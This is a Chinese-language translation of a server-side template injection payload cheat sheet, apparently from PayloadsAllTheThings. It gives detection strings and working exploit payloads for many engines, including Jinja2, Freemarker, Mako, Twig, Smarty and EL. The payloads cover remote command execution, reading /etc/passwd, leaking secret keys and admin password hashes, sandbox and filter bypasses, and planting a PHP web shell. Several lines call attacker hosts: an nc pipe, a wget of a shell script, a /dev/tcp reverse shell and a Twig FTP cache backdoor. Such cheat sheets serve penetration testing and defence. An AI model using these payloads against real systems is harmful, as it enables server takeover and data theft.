# 服务器端模板注入

> 模板注入允许攻击者将模板代码注入到现有（或不存在的）模板中。模板引擎通过在运行时使用静态模板文件替换HTML页面中的变量/占位符，使设计HTML页面变得更容易。

## 概述

- [模板注入](#模板注入)
  - [概述](#概述)
  - [工具](#工具)
  - [方法论](#方法论)
  - [ASP.NET Razor](#aspnet-razor)
    - [ASP.NET Razor - 基础注入](#aspnet-razor---基础注入)
    - [ASP.NET Razor - 命令执行](#aspnet-razor---命令执行)
  - [表达式语言 EL](#expression-language-el)
    - [表达式语言 EL - 基础注入](#expression-language-el---基础注入)
    - [表达式语言 EL - 不包括代码执行的单行注入](#expression-language-el---单行注入不包括代码执行)
    - [表达式语言 EL - 代码执行](#expression-language-el---代码执行)
  - [Java - Freemarker](#freemarker)
    - [Freemarker - 基础注入](#freemarker---基础注入)
    - [Freemarker - 读取文件](#freemarker---读取文件)
    - [Freemarker - 代码执行](#freemarker---代码执行)
    - [Freemarker - 沙箱绕过](#freemarker---沙箱绕过)
  - [Groovy](#groovy)
    - [Groovy - 基础注入](#groovy---基础注入)
    - [Groovy - 读取和创建文件](#groovy---读取和创建文件)
    - [Groovy - HTTP请求：](#groovy---http请求)
    - [Groovy - 命令执行](#groovy---命令执行)
    - [Groovy - 沙箱绕过](#groovy---沙箱绕过)
  - [JavaScript - Handlebars](#handlebars)
    - [Handlebars - 命令执行](#handlebars---命令执行)
  - [Jade / Codepen](#jade--codepen)
  - [Java](#java)
    - [Java - 基础注入](#java---基础注入)
    - [Java - 检索系统环境变量](#java---检索系统环境变量)
    - [Java - 检索 /etc/passwd](#java---检索-etc-passwd)
  - [Django模板](#django-模板)
  - [Python - Jinja2](#jinja2)
    - [Jinja2 - 基础注入](#jinja2---基础注入)
    - [Jinja2 - 模板格式](#jinja2---模板格式)
    - [Jinja2 - 调试语句](#jinja2---调试语句)
    - [Jinja2 - 转储所有使用的类](#jinja2---转储所有使用的类)
    - [Jinja2 - 转储所有配置变量](#jinja2---转储所有配置变量)
    - [Jinja2 - 读取远程文件](#jinja2---读取远程文件)
    - [Jinja2 - 写入远程文件](#jinja2---写入远程文件)
    - [Jinja2 - 远程代码执行](#jinja2---远程代码执行)
      - [在盲RCE上强制输出](#jinja2---在盲RCE上强制输出)
      - [通过调用os.popen().read()利用SSTI](#jinja2---通过调用os.popen().read()利用SSTI)
      - [通过调用subprocess.Popen利用SSTI](#jinja2---通过调用subprocess.Popen利用SSTI)
      - [在不猜测偏移量的情况下调用Popen利用SSTI](#jinja2---在不猜测偏移量的情况下调用Popen利用SSTI)
      - [通过编写恶意配置文件利用SSTI](#jinja2---通过编写恶意配置文件利用SSTI)
    - [Jinja2 - 过滤器绕过](#jinja2---过滤器绕过)
  - [Java - Jinjava](#jinjava)
    - [Jinjava - 基础注入](#jinjava---基础注入)
    - [Jinjava - 命令执行](#jinjava---命令执行)
  - [JavaScript - Lessjs](#lessjs)
    - [Lessjs - SSRF / LFI](#lessjs---ssrf--lfi)
    - [Lessjs < v3 - 命令执行](#lessjs--v3---命令执行)
    - [插件](#插件)
  - [JavaScript - Lodash](#Lodash)
    - [Lodash - 基础注入](#Lodash---基础注入)
    - [Lodash - 命令执行](#Lodash---命令执行)
  - [Python - Mako](#mako)
    - [从TemplateNamespace直接访问os](#直接从TemplateNamespace访问os)
  - [Java - Pebble](#pebble)
    - [Pebble - 基础注入](#pebble---基础注入)
    - [Pebble - 代码执行](#pebble---代码执行)
  - [Ruby](#ruby)
    - [Ruby - 基础注入](#ruby---基础注入)
    - [Ruby - 检索 /etc/passwd](#ruby---检索-etc-passwd)
    - [Ruby - 列出文件和目录](#ruby---列出文件和目录)
    - [Ruby - 代码执行](#ruby---代码执行)
  - [PHP - Smarty](#smarty)
  - [PHP - Twig](#twig)
    - [Twig - 基础注入](#twig---基础注入)
    - [Twig - 模板格式](#twig---模板格式)
    - [Twig - 任意文件读取](#twig---任意文件读取)
    - [Twig - 代码执行](#twig---代码执行)
  - [Java - Velocity](#java---velocity)
  - [Java - Spring](#java---spring)
  - [PHP - patTemplate](#pattemplate)
  - [PHP - PHPlib](#phplib-and-html_template_phplib)
  - [PHP - Plates](#plates)
  - [参考资料](#参考资料)

## 工具

推荐工具：

[Tplmap](https://github.com/epinna/tplmap) - 服务器端模板注入和代码注入检测与利用工具

例如：

```powershell
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```

[SSTImap](https://github.com/vladko312/SSTImap) - 基于[Tplmap](https://github.com/epinna/tplmap)的自动SSTI检测工具，具有交互式界面

例如：

```powershell
python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
python3 ./sstimap.py -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
```

## 方法论

![SSTI秘籍工作流程](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true)

---

## 检测

在大多数情况下，这个多语言有效载荷会在存在SSTI漏洞时触发错误：

```
${{<%[%'"}}%\.
```



## ASP.NET Razor

[官方网站](https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c)

> Razor是一种标记语法，允许您将基于服务器的代码（Visual Basic和C#）嵌入到网页中。

### ASP.NET Razor - 基础注入

```powershell
@(1+2)
```

### ASP.NET Razor - 命令执行

```csharp
@{
  // C#代码
}
```

---

## 表达式语言 EL

[官方网站](https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html)

> 表达式语言（EL）是一种简化访问Java Bean组件和其他对象（如请求、会话和应用程序等）中存储的数据的机制。JSP中有许多操作符用于EL，如算术和逻辑操作符来执行表达式。它是在JSP 2.0中引入的。

### 表达式语言 EL - 基础注入

```java
${<property>}
${1+1}

#{<expression string>}
#{1+1}

T(<javaclass>)
```

### 表达式语言 EL - 属性

* 访问`String`、`java.lang.Runtime`的有趣属性

```ps1
${2.class}
${2.class.forName("java.lang.String")}
${''.getClass().forName('java.lang.Runtime').getMethods()[6].toString()}
```

### 表达式语言 EL - 不包括代码执行的单行注入

```java
// DNS查找
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}

// JVM系统属性查找（例如：java.class.path）
${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".getClass()).invoke("","java.class.path")}

// 修改会话属性
${pageContext.request.getSession().setAttribute("admin",true)}
```

### 表达式语言 EL - 代码执行

```java
// 常见RCE有效载荷
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()

// 使用Runtime的方法
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}

// 使用进程构建器的方法
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("ping x.x.x.x")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.getAttribute("a")}

// 使用反射和调用
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}

// 使用ScriptEngineManager一行代码
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}

// 使用JavaClass
T(java.lang.Runtime).getRuntime().exec('whoami').x

// 使用ScriptEngineManager
${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
```

---

## Freemarker

[官方网站](https://freemarker.apache.org/)

> Apache FreeMarker™ 是一个模板引擎：一个Java库，用于基于模板和变化的数据生成文本输出（HTML网页、电子邮件、配置文件、源代码等）。

您可以在[https://try.freemarker.apache.org](https://try.freemarker.apache.org)尝试您的有效载荷

### Freemarker - 基础注入

模板可以是：

* 默认：`${3*3}`  
* 旧版：`#{3*3}`
* 替代方案：`[=3*3]` 自[FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)起

### Freemarker - 读取文件

```js
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
将返回的字节转换为ASCII
```

### Freemarker - 代码执行

```js
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]
```



### Freemarker - 沙箱绕过

:警告: 仅适用于 Freemarker 2.3.30 版本以下

```js
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

## Groovy

[官方网站](https://groovy-lang.org/)

### Groovy - 基础注入

参考 https://groovy-lang.org/syntax.html ，但 `${9*9}` 是基础注入。

### Groovy - 读取和创建文件

```groovy
${String x = new File('c:/windows/notepad.exe').text}
${String x = new File('/path/to/file').getText('UTF-8')}
${new File("C:\Temp\FileName.txt").createNewFile();}
```

### Groovy - HTTP 请求：

```groovy
${"http://www.google.com".toURL().text}
${new URL("http://www.google.com").getText()}
```

### Groovy - 命令执行

```groovy
${"calc.exe".exec()}
${"calc.exe".execute()}
${this.evaluate("9*9") //(这是一个 Script 类)}
${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
```

### Groovy - 沙箱绕过

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x }
```

或者

```groovy
${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```

---

## Handlebars

[官方网站](https://handlebarsjs.com/)

> Handlebars 将模板编译成 JavaScript 函数。

### Handlebars - 命令执行

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Jade / Codepen

[官方网站](https://codepen.io/)

> 

```python
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

---

## Java

### Java - 基础注入

> 如果 `${...}` 不起作用，请尝试 `#{...}`, `*{...}`, `@{...}` 或 `~{...}`。

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```

### Java - 获取系统环境变量

```java
${T(java.lang.System).getenv()}
```

### Java - 读取 /etc/passwd

```java
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

---

## Django 模板

Django 模板语言默认支持两种渲染引擎：Django 模板（DT）和 Jinja2。Django 模板是一个更简单的引擎。它不允许调用传递的对象函数，因此在 DT 中的 SSTI 影响通常比在 Jinja2 中要小。

### 检测


```python
{% csrf_token %} # 使用 Jinja2 会导致错误
{{ 7*7 }}  # 使用 Django 模板会导致错误
ih0vr{{364|add:733}}d121r # Burp 负载 -> ih0vr1097d121r
```

### Django 模板用于后渗透

```python
# 变量
{{ variable }}
{{ variable.attr }}

# 过滤器
{{ value|length }}

# 标签
{% csrf_token %}
```

### 跨站脚本攻击

```python
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}
```

### 调试信息泄露

```python
{% debug %}
```

### 泄露应用程序的 Secret Key

```python
{{ messages.storages.0.signer.key }}
```

### 管理站点 URL 泄露


```
{% include 'admin/base.html' %}
```

### 泄露管理员用户名和密码哈希


```
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}
```

## Jinja2

[官方网站](https://jinja.palletsprojects.com/)

> Jinja2 是一个功能齐全的 Python 模板引擎。它支持完整的 Unicode，并且可以选择性地集成沙箱执行环境，被广泛使用且采用 BSD 许可。

### Jinja2 - 基础注入

```python
{{4*4}}[[5*5]]
{{7*'7'}} 将得到 7777777
{{config.items()}}
```

Jinja2 被 Python Web 框架如 Django 或 Flask 使用。
上述注入已在 Flask 应用程序上进行了测试。

### Jinja2 - 模板格式

```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}

```

### Jinja2 - 调试语句

如果启用了 Debug 扩展，将可以使用 `{% debug %}` 标签来转储当前上下文以及可用的过滤器和测试。这对于在不设置调试器的情况下查看模板中可使用的内容非常有用。

```python
<pre>{% debug %}</pre>
```

来源: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement

### Jinja2 - 转储所有使用的类

```python
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```



访问`__globals__`和`__builtins__`：

```python
{{ self.__init__.__globals__.__builtins__ }}
```

### Jinja2 - 转储所有配置变量

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

### Jinja2 - 读取远程文件

```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### Jinja2 - 写入远程文件

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

### Jinja2 - 远程代码执行

监听连接

```bash
nc -lnvp 8000
```
在应用程序中，`__builtins__`被过滤时，以下有效载荷是不依赖上下文的，除了存在于jinja2模板对象中之外，不需要任何东西：

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

我们可以使用这些更短的负载：

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

来源[@podalirius_](https://twitter.com/podalirius_)：https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/

通过[objectwalker](https://github.com/p0dalirius/objectwalker)，我们可以找到从`lipsum`到`os`模块的路径。这是目前已知的在Jinja2模板中实现RCE的最短有效载荷：

```python
{{ lipsum.__globals__["os"].popen('id').read() }}
```

来源：https://twitter.com/podalirius_/status/1655970628648697860

#### 利用SSTI调用subprocess.Popen

:warning: 数字 396 会根据应用程序的不同而变化。

```python
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

#### 在不猜测偏移量的情况下，利用SSTI调用Popen

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

通过简单地修改有效载荷来清理输出并便于命令输入（https://twitter.com/SecGus/status/1198976764351066113）在另一个GET参数中包含一个名为"input"的变量，其中包含您想要运行的命令（例如：&input=ls）

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```

#### 利用SSTI编写恶意配置文件。

```python
# 恶意配置
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output

RUNCMD = check_output
') }}

# 加载恶意配置
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# 连接到恶意主机
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```

### Jinja2 - 过滤器绕过

```python
request.__class__
request["__class__"]
```

绕过 `_`

```python
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

绕过 `[` 和 `]`

```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
or
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

绕过 `|join`

```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

通过https://twitter.com/SecGus绕过最常见的过滤器（'.','_','|join','[',']','mro' 和 'base'）：

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```



## Jinjava

[官方网站](https://github.com/HubSpot/jinjava)

> 基于Java的模板引擎，基于django模板语法，适应于渲染jinja模板（至少在HubSpot内容中使用的jinja子集）。

### Jinjava - 基本注入

```python
{{'a'.toUpperCase()}} 将得到 'A'
{{ request }} 将返回一个请求对象，如 com.[...].context.TemplateContextRequest@23548206
```

Jinjava是由Hubspot开发的开源项目，可在 [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/) 获取

### Jinjava - 命令执行

通过 https://github.com/HubSpot/jinjava/pull/230 修复

```python
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

---

## Lessjs

[官方网站](https://lesscss.org/)

> Less（代表更精简的样式表）是CSS的后向兼容语言扩展。这是Less语言的官方文档，以及Less.js的文档，Less.js是将您的Less样式转换为CSS样式的JavaScript工具。

### Lessjs - SSRF / LFI

```less
@import (inline) "http://localhost";
// 或
@import (inline) "/etc/passwd";
```

### Lessjs < v3 - 命令执行

```less
body {
  color: `global.process.mainModule.require("child_process").execSync("id")`;
}
```

### 插件

Lessjs插件可以远程包含，并由在Less转换时执行的JavaScript组成。

```less
// 本地插件使用示例
@plugin "plugin-2.7.js";
```

或

```less
// 远程插件使用示例
@plugin "http://example.com/plugin-2.7.js"
```

版本2示例RCE插件：

```javascript
functions.add('cmd', function(val) {
  return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
});
```

版本3及以上示例RCE插件

```javascript
//易受攻击的插件 (3.13.1)
registerPlugin({
    install: function(less, pluginManager, functions) {
        functions.add('cmd', function(val) {
            return global.process.mainModule.require('child_process').execSync(val.value).toString();
        });
    }
})
```

---

## Lodash

[官方网站](https://lodash.com/docs/4.17.15)

### Lodash - 基本注入

如何创建模板：

```javascript
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

- **string:** 模板字符串。
- **options.interpolate:** 是一个正则表达式，指定HTML *插值* 分隔符。
- **options.evaluate:** 是一个正则表达式，指定HTML *评估* 分隔符。
- **options.escape:** 是一个正则表达式，指定HTML *转义* 分隔符。

出于RCE的目的，模板的分隔符由 **options.evaluate** 参数决定。

```javascript
{{= _.VERSION}}
${= _.VERSION}
<%= _.VERSION %>


{{= _.templateSettings.evaluate }}
${= _.VERSION}
<%= _.VERSION %>

```

### Lodash - 命令执行

```
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

## Mako

[官方网站](https://www.makotemplates.org/)

> Mako是一个用Python编写的模板库。从概念上讲，Mako是一种嵌入式Python（即Python服务器页面）语言，它提炼了组件化布局和继承的熟悉概念，以产生最直观和最灵活的模型之一，同时也与Python调用和作用域语义保持紧密联系。

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

### 直接从TemplateNamespace访问os：

任何这些有效载荷都允许直接访问 `os` 模块

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

PoC :

```python
>>> print(Template("${self.module.cache.util.os}").render())
<module 'os' from '/usr/local/lib/python3.10/os.py'>
```

来源 [@podalirius_](https://twitter.com/podalirius_) : [https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)


---

# 翻译结果

## Pebble

[官方网站](https://pebbletemplates.io/)

> Pebble 是一个受 [Twig](./#twig) 启发的 Java 模板引擎，类似于 Python 的 [Jinja](./#jinja2) 模板引擎语法。它具有模板继承和易于阅读的语法，内置自动转义以增强安全性，并包括对国际化的集成支持。

### Pebble - 基本注入

```java
{{ someString.toUPPERCASE() }}
```

### Pebble - 代码执行

旧版本的 Pebble（< 版本 3.0.9）：`{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`。

新版本的 Pebble：

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

---

## Ruby

### Ruby - 基本注入

ERB：

```ruby
<%= 7 * 7 %>
```

Slim：

```ruby
#{ 7 * 7 }
```

### Ruby - 读取 /etc/passwd

```ruby
<%= File.open('/etc/passwd').read %>
```

### Ruby - 列出文件和目录

```ruby
<%= Dir.entries('/') %>
```

### Ruby - 代码执行

使用 SSTI 执行 ERB 引擎的代码。

```ruby
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

使用 SSTI 执行 Slim 引擎的代码。

```powershell
#{ %x|env| }
```

---

## Smarty

[官方网站](https://www.smarty.net/docs/en/)

> Smarty 是 PHP 的一个模板引擎。

```python
{$smarty.version}
{php}echo `id`;{/php} //在 smarty v3 中已弃用
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // 兼容 v3
{system('cat index.php')} // 兼容 v3
```

---

## Twig

[官方网站](https://twig.symfony.com/)

> Twig 是 PHP 的一个现代模板引擎。

### Twig - 基本注入

```python
{{7*7}}
{{7*'7'}} 将结果为 49
{{dump(app)}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
```

### Twig - 模板格式

```python
$output = $twig > render (
  'Dear' . $_GET['custom_greeting'],
  array("first_name" => $user.first_name)
);

$output = $twig > render (
  "Dear {first_name}",
  array("first_name" => $user.first_name)
);
```

### Twig - 任意文件读取

```python
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{include("wp-config.php")}}
```

### Twig - 代码执行

```python
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
